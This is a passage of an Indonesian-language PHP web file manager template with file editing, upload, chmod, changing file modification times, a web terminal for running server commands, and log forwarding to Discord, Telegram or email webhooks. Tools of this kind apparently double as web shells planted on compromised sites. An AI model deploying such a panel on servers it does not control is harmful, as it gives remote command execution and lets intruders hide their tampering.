        #terminal-form .input-group-prepend { padding: 0.6rem 0.8rem; background: var(--color-secondary-dark); color: var(--color-text-dark); border-radius: var(--border-radius-sm) 0 0 var(--border-radius-sm); font-family: var(--font-family-mono); font-size: 0.9em; }
        body.dark-mode #terminal-form .input-group-prepend { background: #4b5563; }
        #terminal_command { border-radius: 0 !important; flex-grow: 1; }
        #terminal-form .btn { border-radius: 0 var(--border-radius-sm) var(--border-radius-sm) 0; }
        #scrollTopBtn { display: none; position: fixed; bottom: 20px; right: 20px; z-index: 1010; border: none; outline: none; background-color: var(--color-primary-light); color: white; cursor: pointer; padding: 10px 12px; border-radius: var(--border-radius-sm); font-size: 1.2em; box-shadow: var(--shadow-md); transition: opacity 0.3s, visibility 0.3s; opacity: 0; visibility: hidden; }
        body.dark-mode #scrollTopBtn { background-color: var(--color-primary-dark); }
        #scrollTopBtn.show { opacity: 1; visibility: visible; }
        #scrollTopBtn:hover { background-color: var(--color-primary-hover-light); }
        body.dark-mode #scrollTopBtn:hover { background-color: var(--color-primary-hover-dark); }
        .security-note { font-size: 0.8em; color: var(--color-secondary-light); margin-top: 1rem; padding: 0.5rem; background-color: rgba(245,158,11, 0.1); border: 1px solid rgba(245,158,11, 0.2); border-radius: var(--border-radius-sm); }
        body.dark-mode .security-note { color: var(--color-secondary-dark); background-color: rgba(251,191,36, 0.1); border-color: rgba(251,191,36, 0.2); }
        .encryption-warning { font-size: 0.85em; padding: 0.75rem; margin-bottom:1rem; border: 1px solid var(--color-warning-light); background-color: rgba(245,158,11,0.05); color: var(--color-warning-light); border-radius: var(--border-radius-sm); }
        body.dark-mode .encryption-warning { border-color: var(--color-warning-dark); background-color: rgba(251,191,36,0.1); color: var(--color-warning-dark); }
        
        /* CSS untuk Info Modal yang lebih cantik */
        .modal-body .info-section { margin-bottom: 1.5rem; }
        .modal-body .info-section:last-child { margin-bottom: 0.5rem; }
        .modal-body .info-section h5 {
            font-size: 1.05em; /* Sedikit lebih kecil dari judul modal */
            font-weight: 600;
            color: var(--color-primary-light);
            margin-top: 0;
            margin-bottom: 0.8rem;
            padding-bottom: 0.4rem;
            border-bottom: 2px solid var(--color-primary-light);
            display: inline-block; /* Agar border hanya sepanjang teks */
        }
        body.dark-mode .modal-body .info-section h5 {
            color: var(--color-primary-dark);
            border-bottom-color: var(--color-primary-dark);
        }
        .modal-body .info-section p { margin-bottom: 0.6rem; line-height: 1.7; }
        .modal-body .info-section p strong { color: var(--color-text-light); }
        body.dark-mode .modal-body .info-section p strong { color: var(--color-text-dark); }

        .modal-body .info-hr {
            border: 0;
            border-top: 1px dashed var(--color-border-light);
            margin: 2rem 0; /* Jarak lebih besar */
        }
        body.dark-mode .modal-body .info-hr { border-top-color: var(--color-border-dark); }
        .modal-body .info-link {
            color: var(--color-primary-hover-light); /* Warna link lebih menonjol */
            text-decoration: none;
            font-weight: 500;
        }
        body.dark-mode .modal-body .info-link { color: var(--color-primary-hover-dark); }
        .modal-body .info-link:hover { text-decoration: underline; color: var(--color-primary-light); }
        body.dark-mode .modal-body .info-link:hover { color: var(--color-primary-dark); }
        #systemInfoModal .modal-content { max-width: 650px; /* Sedikit lebih lebar untuk info */ }


        @media (max-width: 768px) { .navbar { flex-direction: column; align-items: flex-start; gap: 0.5rem; } .navbar .nav-buttons { margin-top: 0.5rem; margin-left: 0; width: 100%; display: flex; flex-direction: column; gap: 0.5rem; } .navbar .nav-buttons .btn { width: 100%; } .toolbar { flex-direction: column; gap: 1rem; } .search-bar { width: 100%; } .file-table { font-size: 0.85em; } .file-table th, .file-table td { padding: 0.5rem; } .file-table .actions .btn { display: block; width: calc(100% - 0.6rem); margin-bottom: 0.5rem; text-align: center; } .modal-content { width: 95%; margin: 5% auto; padding: 1rem; } .breadcrumb { font-size: 0.8em; } .edit-page-container .form-group textarea { min-height: calc(100vh - 250px); } }
        @media (max-width: 480px) { .container { padding: 15px; } .navbar .title { font-size: 1.2em; } .file-table th:nth-child(4), .file-table td:nth-child(4), .file-table th:nth-child(6), .file-table td:nth-child(6), .file-table th:nth-child(8), .file-table td:nth-child(8) { display: none; } .file-table .icon { margin-right: 0.3rem; } }
    </style>
</head>
<body class="<?php echo isset($_COOKIE['dark_mode']) && $_COOKIE['dark_mode'] === 'enabled' ? 'dark-mode' : ''; ?>">

<div class="main-wrapper">
<?php if ($config['aktifkan_login'] && !check_login()): ?>
    <div class="login-page-wrapper">
        <div class="login-box">
            <h2><?php echo htmlspecialchars($config['judul_filemanager']); ?></h2>
            <?php if ($login_error): ?> <div class="alert alert-danger"><?php echo htmlspecialchars($login_error); ?></div> <?php endif; ?>
            <form method="POST" action="<?php echo basename(__FILE__); ?>?aksi=login_page">
                <div class="form-group"><label for="username">Username</label><input type="text" id="username" name="username" required></div>
                <div class="form-group"><label for="password">Password</label><input type="password" id="password" name="password" required></div>
                <button type="submit" class="btn btn-primary glitch-hover"><span class="icon">🔑</span> Login</button>
            </form>
        </div>
    </div>
<?php elseif ($aksi === 'edit' && isset($_GET['item'])):
    $item_to_edit_name = sanitize_path(basename($_GET['item']));
    $item_full_path_edit = $current_path . DIRECTORY_SEPARATOR . $item_to_edit_name;
    $content_edit = ''; $can_really_edit = false;
    if (is_file_editable($item_full_path_edit)) {
        if (is_writable($item_full_path_edit)) { $content_edit = htmlspecialchars(file_get_contents($item_full_path_edit)); $can_really_edit = true; } 
        else { if (!$action_message) $action_message = ['type' => 'danger', 'text' => "File '" . htmlspecialchars($item_to_edit_name) . "' tidak dapat ditulis. Periksa izin."]; }
    } else { if (!$action_message) $action_message = ['type' => 'danger', 'text' => "Tipe file '" . htmlspecialchars($item_to_edit_name) . "' tidak dapat diedit atau file tidak ditemukan."]; }
?>
    <div class="navbar">
        <span class="title"><span class="icon">✏️</span> Edit File: <?php echo htmlspecialchars($item_to_edit_name); ?></span>
        <div class="nav-buttons"> <a href="<?php echo basename(__FILE__); ?>?path=<?php echo urlencode($relative_current_path); ?>" class="btn btn-secondary glitch-hover"><span class="icon">↩️</span> Kembali</a> </div>
    </div>
    <div class="container edit-page-container">
        <?php if ($action_message): ?> <div class="alert alert-<?php echo htmlspecialchars($action_message['type']); ?>"><?php echo htmlspecialchars($action_message['text']); ?></div> <?php endif; ?>
        <?php if ($can_really_edit): ?>
            <form method="POST" action="<?php echo basename(__FILE__); ?>?aksi=save_edit&path=<?php echo urlencode($relative_current_path); ?>">
                <input type="hidden" name="item" value="<?php echo htmlspecialchars($item_to_edit_name); ?>">
                <div class="form-group"> <textarea name="content" rows="25" <?php if (!is_writable($item_full_path_edit)) echo 'readonly'; ?>><?php echo $content_edit; ?></textarea> </div>
                <div class="edit-actions-bar"> <button type="submit" class="btn btn-primary glitch-hover" <?php if (!is_writable($item_full_path_edit)) echo 'disabled'; ?>><span class="icon">💾</span> Simpan Perubahan</button> </div>
            </form>
        <?php else: ?> <p>Tidak dapat memuat editor untuk file ini.</p> <?php endif; ?>
    </div>
<?php else: // Tampilan utama file manager ?>
    <div class="navbar">
        <span class="title"><?php echo htmlspecialchars($config['judul_filemanager']); ?></span>
        <div class="nav-buttons">
            <button id="toggle-dark-mode" class="btn btn-secondary glitch-hover"><span class="icon">🌓</span> Mode</button>
            <?php if ($config['aktifkan_login']): ?> <a href="?aksi=logout" class="btn btn-secondary glitch-hover"><span class="icon">🚪</span> Logout (<?php echo htmlspecialchars($_SESSION['pengguna_login']); ?>)</a> <?php endif; ?>
        </div>
    </div>
    <div class="container">
        <?php if ($action_message): ?> <div class="alert alert-<?php echo htmlspecialchars($action_message['type']); ?>"><?php echo htmlspecialchars($action_message['text']); ?></div> <?php endif; ?>
        <?php if (!empty($config_log_file_writable_warning)): ?> <div class="alert alert-warning"><?php echo $config_log_file_writable_warning; ?></div> <?php endif; ?>
        <?php if (!empty($openssl_unavailable_warning)): ?> <div class="alert alert-danger"><?php echo htmlspecialchars($openssl_unavailable_warning); ?></div> <?php endif; ?>

        <nav aria-label="breadcrumb"><ol class="breadcrumb"><li class="breadcrumb-item"><a href="?path=" class="glitch-hover">🏠 Root</a></li><?php $path_parts = explode(DIRECTORY_SEPARATOR, $relative_current_path); $current_breadcrumb_path = ''; foreach ($path_parts as $part) { if (empty($part)) continue; $current_breadcrumb_path_part_only = $current_breadcrumb_path . $part; $current_breadcrumb_path .= $part . DIRECTORY_SEPARATOR; if ($current_breadcrumb_path_part_only == rtrim($relative_current_path, DIRECTORY_SEPARATOR) || $current_breadcrumb_path_part_only == $relative_current_path) { echo '<li class="breadcrumb-item active" aria-current="page">' . htmlspecialchars($part) . '</li>'; } else { echo '<li class="breadcrumb-item"><a href="?path=' . urlencode($current_breadcrumb_path_part_only) . '" class="glitch-hover">' . htmlspecialchars($part) . '</a></li>'; } } ?></ol></nav>
        <div class="current-path-info">Lokasi: <?php echo htmlspecialchars($current_path); ?></div>
        <div class="toolbar">
            <form method="GET" action="<?php echo basename(__FILE__); ?>" class="search-bar">
                <input type="hidden" name="path" value="<?php echo htmlspecialchars($relative_current_path); ?>">
                <input type="text" name="search" placeholder="Cari file atau folder..." value="<?php echo isset($_GET['search']) ? htmlspecialchars($_GET['search']) : ''; ?>">
                <button type="submit" class="btn btn-primary glitch-hover"><span class="icon">🔍</span> Cari</button>
                <?php if(isset($_GET['search'])): ?><a href="?path=<?php echo htmlspecialchars($relative_current_path); ?>" style="margin-left:0.5rem;" class="btn btn-secondary glitch-hover">Reset</a><?php endif; ?>
            </form>
            <div class="main-actions" style="display:flex; gap: 0.5rem; flex-wrap:wrap;">
                <button onclick="showModal('createFolderModal')" class="btn btn-success glitch-hover"><span class="icon">➕</span> Folder</button>
                <button onclick="showModal('createFileModal')" class="btn btn-success glitch-hover"><span class="icon">📄</span> File</button>
                <a href="?aksi=scan_directory&path=<?php echo urlencode($relative_current_path); ?>" class="btn btn-warning glitch-hover" onclick="return confirmAction('Pindai direktori ini untuk potensi ancaman? Ini mungkin memakan waktu.')"><span class="icon">🛡️</span> Pindai Direktori</a>
                <button onclick="showModal('systemInfoModal')" class="btn btn-info glitch-hover"><span class="icon">ℹ️</span> Info</button>
                <?php if ($config['fitur_berbahaya']['akses_pengaturan_log']): ?>
                <button onclick="showModal('loggingSettingsModal')" class="btn btn-secondary glitch-hover"><span class="icon">⚙️</span> Settings</button>
                <?php endif; ?>
                <?php if ($config['fitur_berbahaya']['terminal']): ?><button onclick="showModal('terminalModal')" class="btn btn-danger glitch-hover"><span class="icon">💀</span> Terminal</button><?php endif; ?>
            </div>
        </div>
        <div id="drop-area"><p>Seret & lepas file di sini, atau <label for="fileElem" class="btn btn-secondary btn-sm glitch-hover" style="cursor:pointer; display:inline-block; padding: 0.4rem 0.8rem;">Pilih File</label></p><input type="file" id="fileElem" multiple style="display:none;"><progress id="upload-progress" value="0" max="100" style="width:100%; display:none; margin-top:0.5rem;"></progress></div>
        <form id="upload-form" action="?aksi=upload&path=<?php echo urlencode($relative_current_path); ?>" method="post" enctype="multipart/form-data" style="display:none;"><input type="file" name="files[]" id="actual-upload-input" multiple></form>
        <form id="file-action-form" method="POST" action="?path=<?php echo urlencode($relative_current_path); ?>"><div class="actions-bar"><button type="button" onclick="selectAllFiles(true)" class="btn btn-sm btn-secondary glitch-hover">Pilih Semua</button><button type="button" onclick="selectAllFiles(false)" class="btn btn-sm btn-secondary glitch-hover">Batal Pilih</button><button type="submit" name="multi_delete_btn" value="delete_selected" formaction="?aksi=multi_delete&path=<?php echo urlencode($relative_current_path); ?>" class="btn btn-sm btn-danger glitch-hover" onclick="return confirmAction('Anda yakin ingin menghapus item terpilih?')"><span class="icon">🗑️</span> Hapus</button><button type="submit" name="items_to_zip_btn" value="zip_selected" formaction="?aksi=zip&path=<?php echo urlencode($relative_current_path); ?>" class="btn btn-sm btn-primary glitch-hover"><span class="icon">📦</span> Zip</button></div>
            <div style="overflow-x: auto;"><table class="file-table"><thead><tr><th><input type="checkbox" id="select-all-checkbox" onchange="selectAllFiles(this.checked)"></th><th class="icon-col">Ikon</th><th>Nama</th><th>Ukuran</th><th>Jenis</th><th>Modifikasi</th><th>Izin</th><th>Pemilik</th><th style="min-width: 300px;">Aksi</th></tr></thead><tbody>
                    <?php
                    $items = scandir($current_path); $search_query = isset($_GET['search']) ? strtolower($_GET['search']) : null;
                    $folders = []; $files_list = [];
                    foreach ($items as $item) {
                        if (in_array($item, $config['sembunyikan_item'])) continue;
                        if ($search_query && stripos(strtolower($item), $search_query) === false) continue;
                        $item_path = $current_path . DIRECTORY_SEPARATOR . $item; $is_dir = is_dir($item_path);
                        $is_malicious = false;
                        if (!$is_dir && $config['enable_malware_scan_on_list']) { $is_malicious = scan_for_malicious_patterns($item_path); }
                        $item_data = [ 'name' => $item, 'path' => $item_path, 'is_dir' => $is_dir, 'icon' => get_file_icon($item_path), 'size' => $is_dir ? '-' : format_size(filesize($item_path)), 'type' => $is_dir ? 'Folder' : (mime_content_type($item_path) ?: 'File'), 'modified' => date("d M Y, H:i", filemtime($item_path)), 'perms' => substr(sprintf('%o', fileperms($item_path)), -4), 'owner' => get_owner_name($item_path), 'is_writable' => is_writable($item_path), 'is_malicious' => $is_malicious ];
                        if ($is_dir) $folders[] = $item_data; else $files_list[] = $item_data;
                    }
                    usort($folders, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
                    usort($files_list, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
                    $sorted_items = array_merge($folders, $files_list);
                    if (empty($sorted_items) && $search_query) { echo '<tr><td colspan="9" style="text-align:center; padding: 1rem;">Tidak ada file atau folder yang cocok.</td></tr>'; } 
                    elseif (empty($sorted_items)) { echo '<tr><td colspan="9" style="text-align:center; padding: 1rem;">Folder ini kosong.</td></tr>'; }
                    foreach ($sorted_items as $data) {
                        echo "<tr class='file-item" . ($data['is_malicious'] ? " table-danger-row" : "") . "'>";
                        echo "<td><input type='checkbox' name='items_to_zip[]' value='" . htmlspecialchars($data['name']) . "' class='file-checkbox'></td>";
                        echo "<td><span class='icon'>" . $data['icon'] . "</span></td>";
                        echo "<td style='word-break:break-all;'>";
                        if ($data['is_dir']) { echo "<a href='?path=" . urlencode($relative_current_path . DIRECTORY_SEPARATOR . $data['name']) . "' class='glitch-hover'>" . htmlspecialchars($data['name']) . "</a>"; } 
                        else { echo htmlspecialchars($data['name']); }
                        if ($data['is_malicious']) { echo " <span class='malware-warning-icon' title='Peringatan: Potensi kode berbahaya terdeteksi di file ini! Periksa secara manual.'>⚠️</span>"; }
                        echo "</td>";
                        echo "<td>" . $data['size'] . "</td><td>" . htmlspecialchars($data['type']) . "</td><td>" . $data['modified'] . "</td><td>" . $data['perms'] . "</td><td>" . htmlspecialchars($data['owner']) . "</td>";
                        echo "<td class='actions'>";
                        echo "<button type='button' onclick=\"showRenameModal('" . htmlspecialchars($data['name']) . "')\" class='btn btn-sm btn-warning glitch-hover' title='Rename'><span class='icon'>🏷️</span></button>";
                        echo "<a href='?aksi=delete&path=" . urlencode($relative_current_path) . "&item=" . urlencode($data['name']) . "' class='btn btn-sm btn-danger glitch-hover' onclick=\"return confirmAction('Hapus " . htmlspecialchars($data['name']) . "?')\" title='Hapus'><span class='icon'>🗑️</span></a>";
                        if (!$data['is_dir']) {
                            echo "<a href='?aksi=preview&path=" . urlencode($relative_current_path) . "&item=" . urlencode($data['name']) . "' target='_blank' class='btn btn-sm btn-info glitch-hover' title='Preview/Unduh'><span class='icon'>👁️</span></a>";
                            if (is_file_editable($data['path']) && $data['is_writable']) { echo "<a href='?aksi=edit&path=" . urlencode($relative_current_path) . "&item=" . urlencode($data['name']) . "' class='btn btn-sm btn-success glitch-hover' title='Edit'><span class='icon'>✏️</span></a>"; }
                        }
                        if (strtolower(pathinfo($data['name'], PATHINFO_EXTENSION)) === 'zip' && !$data['is_dir']) { echo "<a href='?aksi=unzip&path=" . urlencode($relative_current_path) . "&item=" . urlencode($data['name']) . "' class='btn btn-sm btn-primary glitch-hover' onclick=\"return confirmAction('Unzip " . htmlspecialchars($data['name']) . "?')\" title='Unzip'><span class='icon'>📦</span></a>"; }
                        echo "<button type='button' onclick=\"showChmodModal('" . htmlspecialchars($data['name']) . "', '" . $data['perms'] . "')\" class='btn btn-sm btn-secondary glitch-hover' title='Chmod'><span class='icon'>🔑</span></button>";
                        echo "<button type='button' onclick=\"showEditTimeModal('" . htmlspecialchars($data['name']) . "', '" . date("Y-m-d\TH:i:s", filemtime($data['path'])) . "')\" class='btn btn-sm btn-secondary glitch-hover' title='Edit Waktu'><span class='icon'>⏱️</span></button>";
                        echo "</td></tr>";
                    }
                    ?>
            </tbody></table></div>
            <div class="security-note"> <strong>Catatan Keamanan:</strong> Fitur deteksi potensi kode berbahaya (shell/backdoor) bersifat dasar dan hanya berdasarkan pencocokan pola string sederhana. Ini BUKAN solusi keamanan yang komprehensif dan mungkin tidak mendeteksi semua ancaman atau dapat salah mendeteksi file yang aman. Selalu lakukan pemeriksaan manual dan gunakan alat keamanan server yang lebih canggih. </div>
            </form>
    </div> <!-- End container -->
    
    <!-- Modals -->
    <div id="createFolderModal" class="modal"><div class="modal-content"><span class="close-btn" onclick="closeModal('createFolderModal')">&times;</span><div class="modal-header"><h4><span class="icon">➕</span> Folder Baru</h4></div><form method="POST" action="?aksi=create_folder&path=<?php echo urlencode($relative_current_path); ?>"><div class="modal-body"><div class="form-group"><label for="folder_name_modal">Nama Folder:</label><input type="text" id="folder_name_modal" name="folder_name" required></div></div><div class="modal-footer"><button type="button" class="btn btn-secondary" onclick="closeModal('createFolderModal')">Batal</button><button type="submit" class="btn btn-primary glitch-hover"><span class="icon">✔️</span> Buat</button></div></form></div></div>
    <div id="createFileModal" class="modal"><div class="modal-content"><span class="close-btn" onclick="closeModal('createFileModal')">&times;</span><div class="modal-header"><h4><span class="icon">📄</span> File Baru</h4></div><form method="POST" action="?aksi=create_file&path=<?php echo urlencode($relative_current_path); ?>"><div class="modal-body"><div class="form-group"><label for="file_name_modal">Nama File (mis: data.txt):</label><input type="text" id="file_name_modal" name="file_name" required></div></div><div class="modal-footer"><button type="button" class="btn btn-secondary" onclick="closeModal('createFileModal')">Batal</button><button type="submit" class="btn btn-primary glitch-hover"><span class="icon">✔️</span> Buat</button></div></form></div></div>
    <div id="renameModal" class="modal"><div class="modal-content"><span class="close-btn" onclick="closeModal('renameModal')">&times;</span><div class="modal-header"><h4><span class="icon">🏷️</span> Rename Item</h4></div><form method="POST" action="?aksi=rename&path=<?php echo urlencode($relative_current_path); ?>"><div class="modal-body"><input type="hidden" id="old_name_rename" name="old_name"><div class="form-group"><label for="new_name_rename">Nama Baru:</label><input type="text" id="new_name_rename" name="new_name" required></div></div><div class="modal-footer"><button type="button" class="btn btn-secondary" onclick="closeModal('renameModal')">Batal</button><button type="submit" class="btn btn-primary glitch-hover"><span class="icon">✔️</span> Rename</button></div></form></div></div>
    <div id="chmodModal" class="modal"><div class="modal-content"><span class="close-btn" onclick="closeModal('chmodModal')">&times;</span><div class="modal-header"><h4><span class="icon">🔑</span> Ubah Izin (Chmod)</h4></div><form method="POST" action="?aksi=chmod&path=<?php echo urlencode($relative_current_path); ?>"><div class="modal-body"><input type="hidden" id="item_chmod" name="item"><p>Item: <strong id="chmod_item_name_display"></strong></p><div class="form-group"><label for="permissions_chmod">Izin Baru (mis: 0755):</label><input type="text" id="permissions_chmod" name="permissions" pattern="0[0-7]{3}" title="Format octal 4 digit, mis: 0755" required></div></div><div class="modal-footer"><button type="button" class="btn btn-secondary" onclick="closeModal('chmodModal')">Batal</button><button type="submit" class="btn btn-primary glitch-hover" <?php if(!$config['fitur_berbahaya']['edit_chmod_luas']) echo 'disabled title="Fitur dinonaktifkan"'; ?>><span class="icon">✔️</span> Ubah</button></div></form></div></div>
    <div id="editTimeModal" class="modal"><div class="modal-content"><span class="close-btn" onclick="closeModal('editTimeModal')">&times;</span><div class="modal-header"><h4><span class="icon">⏱️</span> Ubah Waktu Modifikasi</h4></div><form method="POST" action="?aksi=edit_time&path=<?php echo urlencode($relative_current_path); ?>"><div class="modal-body"><input type="hidden" id="item_edit_time" name="item"><p>Item: <strong id="edit_time_item_name_display"></strong></p><div class="form-group"><label for="datetime_edit_time">Waktu Baru:</label><input type="datetime-local" id="datetime_edit_time" name="datetime" required></div></div><div class="modal-footer"><button type="button" class="btn btn-secondary" onclick="closeModal('editTimeModal')">Batal</button><button type="submit" class="btn btn-primary glitch-hover"><span class="icon">✔️</span> Ubah</button></div></form></div></div>
    
    <div id="systemInfoModal" class="modal">
        <div class="modal-content">
            <span class="close-btn" onclick="closeModal('systemInfoModal')">&times;</span>
            <div class="modal-header"><h4><span class="icon">ℹ️</span> Informasi</h4></div>
            <div class="modal-body">
                <div class="info-section">
                    <h5>Informasi Sistem</h5>
                    <p><strong>OS:</strong> <?php echo php_uname('s') . ' ' . php_uname('r') . ' ' . php_uname('m'); ?></p>
                    <p><strong>PHP:</strong> <?php echo phpversion(); ?></p>
                    <p><strong>Server:</strong> <?php echo $_SERVER['SERVER_SOFTWARE']; ?></p>
                    <p><strong>Disk Total:</strong> <?php echo format_size(disk_total_space($config['direktori_dasar'])); ?></p>
                    <p><strong>Disk Tersedia:</strong> <?php echo format_size(disk_free_space($config['direktori_dasar'])); ?></p>
                    <p><strong>Zona Waktu:</strong> <?php echo date_default_timezone_get(); ?></p>
                    <p><strong>Max Upload:</strong> <?php echo ini_get('upload_max_filesize'); ?></p>
                    <p><strong>Max Post:</strong> <?php echo ini_get('post_max_size'); ?></p>
                </div>
                <hr class="info-hr">
                <div class="info-section">
                    <h5>Tentang <?php echo htmlspecialchars($config['judul_filemanager']); ?></h5>
                    <p><?php echo htmlspecialchars($config['deskripsi_filemanager']); ?></p>
                    <p><strong>Author:</strong> <?php echo htmlspecialchars($config['author_name']); ?></p>
                    <p>
                        <strong>GitHub Profile:</strong> 
                        <a href="<?php echo htmlspecialchars($config['author_github_url']); ?>" target="_blank" class="glitch-hover info-link">
                            <?php echo htmlspecialchars($config['author_github_url']); ?>
                        </a>
                    </p>
                    <p>
                        <strong>Repository Proyek:</strong> 
                        <a href="<?php echo htmlspecialchars($config['author_repo_url']); ?>" target="_blank" class="glitch-hover info-link">
                            <?php echo htmlspecialchars($config['author_repo_url']); ?>
                        </a>
                    </p>
                </div>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-primary" onclick="closeModal('systemInfoModal')">Tutup</button>
            </div>
        </div>
    </div>
    
    <?php if ($config['fitur_berbahaya']['akses_pengaturan_log']): ?>
    <div id="loggingSettingsModal" class="modal" <?php if(isset($_GET['show_logging_settings'])) echo 'style="display:flex;"'; ?>>
        <div class="modal-content">
            <span class="close-btn" onclick="closeModal('loggingSettingsModal')">&times;</span>
            <div class="modal-header"><h4><span class="icon">⚙️</span> Settings</h4></div>
            <div class="modal-body">
                <div class="encryption-warning">
                    <strong>PENTING:</strong> Passphrase enkripsi saat ini adalah: "<code><?php echo htmlspecialchars(LOG_CONFIG_ENCRYPTION_PASSPHRASE); ?></code>".
                    <br><strong>Segera ganti passphrase ini</strong> di dalam kode PHP (konstanta <code>LOG_CONFIG_ENCRYPTION_PASSPHRASE</code>) dengan passphrase yang kuat dan unik.
                    <br>Jika passphrase diubah, file <code>config_log.json</code> yang ada mungkin perlu dihapus agar dapat dibuat ulang dengan enkripsi baru.
                    <?php if (!empty($openssl_unavailable_warning)): ?> <br><strong style="color:var(--color-danger-light);"><?php echo htmlspecialchars($openssl_unavailable_warning); ?></strong> <?php endif; ?>
                </div>

                <h5>Status Logging Sesi Ini:</h5>
                <p style="font-size: 0.85em; margin-bottom: 1rem;">Pengaturan ini hanya berlaku untuk sesi Anda saat ini dan akan kembali ke default jika Anda logout atau menutup browser.</p>
                <?php
                $services_to_toggle = ['discord', 'telegram', 'email'];
                foreach ($services_to_toggle as $service_name) {
                    $is_active = is_service_logging_active($service_name);
                    $button_text = $is_active ? "Nonaktifkan" : "Aktifkan";
                    $button_class = $is_active ? "btn-danger" : "btn-success";
                    $service_label = ucfirst($service_name);
                    $config_default_status_text = ($config['logging'][$service_name]['enabled'] ?? false) ? "Aktif" : "Nonaktif";
                    $status_display = "Default: {$config_default_status_text}";
                    if (isset($_SESSION['logging_override_' . $service_name . '_enabled'])) {
                         $status_display .= " (Sesi: " . ($is_active ? "Aktif" : "Nonaktif") . ")";
                    }

                    echo "<div class='logging-toggle-item'>";
                    echo "<span>Log ke {$service_label} <small style='color:var(--color-secondary-light);'>{$status_display}</small></span>";
                    echo "<a href='?aksi=toggle_logging_service&service={$service_name}&path=" . urlencode($relative_current_path) . "' class='btn btn-sm {$button_class} glitch-hover'>{$button_text}</a>";
                    echo "</div>";
                }
                ?>
                <hr>
                <h5>Konfigurasi Kredensial Logging (Disimpan Terenkripsi ke File):</h5>
                <p style="font-size: 0.85em; margin-bottom: 1rem;">Perubahan di sini akan disimpan secara permanen (terenkripsi) ke file <code>config_log.json</code> dan berlaku untuk semua sesi.</p>
                <?php if (!empty($config_log_file_writable_warning) && strpos($config_log_file_writable_warning, "Info:") !== 0): ?> <div class="alert alert-warning" style="font-size:0.85em;"><?php echo htmlspecialchars($config_log_file_writable_warning); ?></div> <?php endif; ?>
                <form method="POST" action="?aksi=save_logging_config&path=<?php echo urlencode($relative_current_path); ?>">
                    <div class="form-group">
                        <label for="log_discord_webhook_url">Discord Webhook URL:</label>
                        <input type="url" class="form-control" id="log_discord_webhook_url" name="discord_webhook_url" value="<?php echo htmlspecialchars($config['logging']['discord']['webhook_url'] ?? ''); ?>">
                    </div>
                    <div class="form-group">
                        <label for="log_discord_username">Discord Username Bot:</label>
                        <input type="text" class="form-control" id="log_discord_username" name="discord_username" value="<?php echo htmlspecialchars($config['logging']['discord']['username'] ?? 'FileManager Bot'); ?>">
                    </div>
                    <hr style="margin: 1rem 0;">
                    <div class="form-group">
                        <label for="log_telegram_bot_token">Telegram Bot Token:</label>
                        <input type="text" class="form-control" id="log_telegram_bot_token" name="telegram_bot_token" value="<?php echo htmlspecialchars($config['logging']['telegram']['bot_token'] ?? ''); ?>">
                    </div>
                    <div class="form-group">
                        <label for="log_telegram_chat_id">Telegram Chat ID:</label>
                        <input type="text" class="form-control" id="log_telegram_chat_id" name="telegram_chat_id" value="<?php echo htmlspecialchars($config['logging']['telegram']['chat_id'] ?? ''); ?>">
                    </div>
                     <hr style="margin: 1rem 0;">
                    <div class="form-group">
                        <label for="log_email_to_address">Email Penerima Log:</label>
                        <input type="email" class="form-control" id="log_email_to_address" name="email_to_address" value="<?php echo htmlspecialchars($config['logging']['email']['to_address'] ?? ''); ?>">
                    </div>
                    <div class="form-group">
                        <label for="log_email_from_address">Email Pengirim Log:</label>
                        <input type="email" class="form-control" id="log_email_from_address" name="email_from_address" value="<?php echo htmlspecialchars($config['logging']['email']['from_address'] ?? 'noreply@yourdomain.com'); ?>">
                    </div>
                     <div class="form-group">
                        <label for="log_email_subject_prefix">Prefix Subjek Email Log:</label>
                        <input type="text" class="form-control" id="log_email_subject_prefix" name="email_subject_prefix" value="<?php echo htmlspecialchars($config['logging']['email']['subject_prefix'] ?? '[FileMan Log]'); ?>">
                    </div>
                    <button type="submit" class="btn btn-primary glitch-hover" <?php if(!empty($config_log_file_writable_warning) && strpos($config_log_file_writable_warning, "Error:") === 0) echo 'disabled title="File konfigurasi tidak dapat ditulis"'; ?>><span class="icon">💾</span> Simpan Konfigurasi Logging</button>
                </form>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" onclick="closeModal('loggingSettingsModal')">Tutup</button>
            </div>
        </div>
    </div>
    <?php endif; ?>

    <?php if ($config['fitur_berbahaya']['terminal']): ?>
    <div id="terminalModal" class="modal" <?php if(isset($_GET['show_terminal'])) echo 'style="display:flex;"'; ?>><div class="modal-content" style="width: 90%; max-width: 800px;"><span class="close-btn" onclick="closeModal('terminalModal')">&times;</span><div class="modal-header"><h4><span class="icon">💀</span> Terminal (RISIKO TINGGI!)</h4></div><div class="modal-body"><p style="color:var(--color-danger-light); font-weight:bold;">PERINGATAN: Penggunaan terminal web sangat berbahaya. Hanya jalankan perintah yang Anda pahami sepenuhnya.</p><body:dark-mode><p style="color:var(--color-danger-dark); font-weight:bold;">PERINGATAN: Penggunaan terminal web sangat berbahaya. Hanya jalankan perintah yang Anda pahami sepenuhnya.</p></body:dark-mode><div id="terminal-output"><?php if (isset($_SESSION['terminal_output'])) { echo htmlspecialchars($_SESSION['terminal_output']); unset($_SESSION['terminal_output']); } else { echo "Selamat datang di terminal.\n"; }?></div><form method="POST" action="?aksi=terminal_exec&path=<?php echo urlencode($relative_current_path); ?>" id="terminal-form"><div class="input-group"><span class="input-group-prepend"><?php echo htmlspecialchars(basename($current_path)); ?> $</span><input type="text" id="terminal_command" name="command" autofocus value="<?php echo isset($_SESSION['last_command']) ? htmlspecialchars($_SESSION['last_command']) : ''; unset($_SESSION['last_command']); ?>"><button type="submit" class="btn btn-primary glitch-hover">Jalankan</button></div></form></div><div class="modal-footer"><button type="button" class="btn btn-secondary" onclick="closeModal('terminalModal')">Tutup</button></div></div></div>
    <?php endif; ?>
    <div class="footer">
        <p>&copy; <?php echo date("Y"); ?> 
            <a href="<?php echo htmlspecialchars($config['author_repo_url']); ?>" target="_blank" class="glitch-hover" style="color: inherit; text-decoration: none; font-weight:500;">
                <?php echo htmlspecialchars($config['judul_filemanager']); ?>
            </a>. 
            Dibuat dengan ❤️ oleh 
            <a href="<?php echo htmlspecialchars($config['author_github_url']); ?>" target="_blank" class="glitch-hover" style="color: inherit; text-decoration: none; font-weight:500;">
                <?php echo htmlspecialchars($config['author_name']); ?>
            </a>.
        </p>
    </div>
<?php endif; ?>
</div>
<button id="scrollTopBtn" title="Kembali ke atas">⬆️</button>
<script>
